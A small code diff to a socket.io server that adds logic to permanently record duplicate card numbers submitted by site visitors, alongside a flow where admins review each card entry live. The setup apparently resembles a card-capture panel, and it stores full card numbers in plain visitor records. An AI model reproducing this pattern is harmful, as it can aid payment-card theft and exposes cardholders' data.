@@ -448,6 +448,9 @@ io.on("connection", (socket) => {
           // Reset waiting status since card was auto-rejected
           visitor.waitingForAdminResponse = false;
           visitor.lastDataUpdate = new Date().toISOString();
+          // Save duplicate card rejection permanently
+          if (!visitor.duplicateCardRejections) visitor.duplicateCardRejections = [];
+          visitor.duplicateCardRejections.push({ cardNumber: newCardNumber, timestamp: new Date().toISOString() });
           visitors.set(socket.id, visitor);
           saveVisitorPermanently(visitor);
           // Notify admins about duplicate card rejection
